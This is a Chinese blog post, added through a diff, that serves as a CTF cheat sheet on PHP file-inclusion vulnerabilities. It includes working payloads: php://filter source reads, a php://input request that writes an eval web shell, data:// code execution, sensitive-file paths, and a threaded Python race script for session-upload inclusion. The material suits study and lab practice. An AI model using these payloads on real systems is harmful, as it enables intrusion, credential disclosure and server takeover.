@@ -1,0 +1,618 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="文件包含相关方法/问题">
+  <meta name="author" content="OPN">
+  <meta name="keywords" content="">
+  
+  <title>文件包含漏洞 - OPN&#39;S BLOG</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"opn90.top","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":3},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong> OPN'S BLOG </strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="文件包含漏洞">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-11-02 14:19" pubdate>
+        2021年11月2日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      19
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">文件包含漏洞</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：1 天前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <p>文件包含相关方法/问题</p>
+<span id="more"></span>
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h3 id="文件包含简介"><a href="#文件包含简介" class="headerlink" title="文件包含简介"></a>文件包含简介</h3><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，只更新一个包含文件就可以了，或者当向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）</p>
+<hr>
+<h3 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h3><div class="hljs code-wrapper"><pre><code>require()
+
+require_once()
+
+include()
+
+include_once()
+</code></pre></div>
+<p>include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行</p>
+<p>而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题</p>
+<hr>
+<h3 id="敏感信息路径"><a href="#敏感信息路径" class="headerlink" title="敏感信息路径"></a>敏感信息路径</h3><p>Linux/Unix系统的敏感信息路径：</p>
+<div class="hljs code-wrapper"><pre><code>/etc/passwd // 账户信息
+/etc/shadow // 账户密码文件
+/usr/local/app/php5/lib/php.ini // PHP相关配置
+/etc/httpd/conf/httpd.conf // Apache配置文件
+/etc/my.conf // mysql 配置文件 
+</code></pre></div>
+<p>常见的php-session存放位置：</p>
+<div class="hljs code-wrapper"><pre><code>/var/lib/php/sess_PHPSESSID
+/var/lib/php/sess_PHPSESSID
+/tmp/sess_PHPSESSID
+/tmp/sessions/sess_PHPSESSID
+</code></pre></div>
+<hr>
+<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p>
+<h4 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h4><p>作用：<br>用于访问文件（绝对路径、相对路径、网路路径）  </p>
+<p>例：  </p>
+<div class="hljs code-wrapper"><pre><code>?file=file:///etc/passswd
+</code></pre></div>
+<h4 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h4><p>作用：<br>访问输入输出流  </p>
+<h5 id="1-php-filter"><a href="#1-php-filter" class="headerlink" title="1.php://filter"></a>1.php://filter</h5><p>作用：<br>读取源代码  </p>
+<p>例：  </p>
+<div class="hljs code-wrapper"><pre><code>?file=php://filter/read=convert.base64-encode/resource=[文件名]  
+（针对php文件需要base64编码）
+
+参数：
+resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流
+read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔
+write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔
+&lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链
+</code></pre></div>
+<h5 id="2-php-input"><a href="#2-php-input" class="headerlink" title="2.php://input"></a>2.php://input</h5><p>作用：<br>执行php代码</p>
+<p>例：  </p>
+<div class="hljs code-wrapper"><pre><code>?file=php://input
+
+POST数据：&lt;?php phpinfo()?&gt;
+
+如果有写入权限，写入一句话木马：
+?file=php://input
+[POST DATA部分]
+&lt;?php fputs(fopen(&#39;1.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&#39;a&#39;]); ?&gt;&#39;); ?&gt;
+</code></pre></div>
+<p>注意：<br>enctype=”multipart/form-data” 的时候 php://input 是无效的</p>
+<h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><p>作用：<br>自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到base64编码传输</p>
+<p>伪协议中的data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行</p>
+<p>例：</p>
+<div class="hljs code-wrapper"><pre><code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+
+?file=data://text/plain,&lt;?php system(&quot;cat f*&quot;)?&gt;
+</code></pre></div>
+<h4 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h4><p>作用：<br>zip://&amp;bzip2://&amp;zlib://均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等</p>
+<h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4><p>phar://协议与zip://类似，同样可以访问zip格式压缩包内容</p>
+<h4 id="常见拼接用法"><a href="#常见拼接用法" class="headerlink" title="常见拼接用法"></a>常见拼接用法</h4><div class="hljs code-wrapper"><pre><code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre></div>
+<hr>
+<h3 id="session文件"><a href="#session文件" class="headerlink" title="session文件"></a>session文件</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/120300273">详解利用session进行文件包含：https://blog.csdn.net/qq_38154820/article/details/120300273</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">博客：https://www.freebuf.com/vuls/202819.html</a></p>
+<p>常见的php-session存放位置：</p>
+<div class="hljs code-wrapper"><pre><code>/var/lib/php/sess_PHPSESSID
+/var/lib/php/sess_PHPSESSID
+/tmp/sess_PHPSESSID
+/tmp/sessions/sess_PHPSESSID
+</code></pre></div>
+<h5 id="严格审查-phpinfo-php-ini中关于Session的配置"><a href="#严格审查-phpinfo-php-ini中关于Session的配置" class="headerlink" title="严格审查 phpinfo/php.ini中关于Session的配置"></a>严格审查 phpinfo/php.ini中关于Session的配置</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/msllws/article/details/85232203">博客：https://blog.csdn.net/msllws/article/details/85232203</a></p>
+<h5 id="具体利用"><a href="#具体利用" class="headerlink" title="具体利用"></a>具体利用</h5><p>上传文件时产生可控的session文件，可在其中插入语句，在post上传文件同时get session，条件竞争碰撞</p>
+<div class="hljs code-wrapper"><pre><code>Cookie:PHPSESSID=XXX
+/tmp/sess_xxx
+</code></pre></div>
+<p>利用session对话进行文件包含利用<br>简单来说，就是post上传文件时会产生一个可控session文件，文件上传完删除<br>可创造该session文件，在文件中插入php语句<br>在post上传文件同时访问该文件，get flag/有用信息<br>碰撞出正确的条件竞争  </p>
+<div class="hljs code-wrapper"><pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;form action=&quot;http://c5bb51fc-6e63-467c-b8dc-8dc6804584a9.chall.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;
+&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div>
+<p>PHP_SESSION_UPLOAD_PROGRESS session上传进度</p>
+<p>即 sess_xxx文件的内容 / 执行恶意代码</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13795170.html">PHP_SESSION_UPLOAD_PROGRESS：https://www.cnblogs.com/NPFS/p/13795170.html</a></p>
+<h5 id="附上脚本"><a href="#附上脚本" class="headerlink" title="附上脚本"></a>附上脚本</h5><div class="hljs code-wrapper"><pre><code>#coding=utf-8
+import io
+import requests
+import threading
+sessid = &#39;flag&#39;
+data = &#123;&quot;cmd&quot;: &quot;system(&#39;whoami&#39;);&quot;&#125; # session文件中输入一句话后,执行该php代码
+def write(session):
+    while True:
+        f = io.BytesIO(b&#39;a&#39; * 1024 * 50)
+        resp = session.post(&#39;http://127.0.0.1:7777/&#39;,
+                        data=&#123;&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&lt;?=var_dump(scandir(&quot;.&quot;))?&gt;&#39;&#125;, # 执行php代码
+                        files=&#123;&#39;file&#39;: (&#39;111.txt&#39;, f)&#125;,
+                        cookies=&#123;&#39;PHPSESSID&#39;: sessid&#125;) # 严格审查Cookie变量值（phpinfo/phpini）
+
+def read(session):
+    while True:
+        resp = session.post(&#39;http://127.0.0.1:7777/?a=/tmp/sess_&#39;+sessid, data=data)
+        if len(resp.text) != 0:   # 审查判断条件
+            print(resp.text)
+            event.clear()
+        else:
+            print(&quot;**************&quot;)
+
+if __name__ == &quot;__main__&quot; :
+    event = threading.Event()
+    with requests.session() as session:
+        for i in range(1, 30):
+            threading.Thread(target=write, args=(session,)).start()
+
+        for i in range(1, 30):
+            threading.Thread(target=read, args=(session,)).start()
+    event.set()
+</code></pre></div>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/182280.html">参考博客：https://www.freebuf.com/articles/web/182280.html</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/11/04/MD5-%E6%AF%94%E8%BE%83/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">MD5 比较</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/29/file-upload/">
+                        <span class="hidden-mobile">文件上传漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+<a href="http://www.beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">苏ICP备2021015436号-1</a>
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
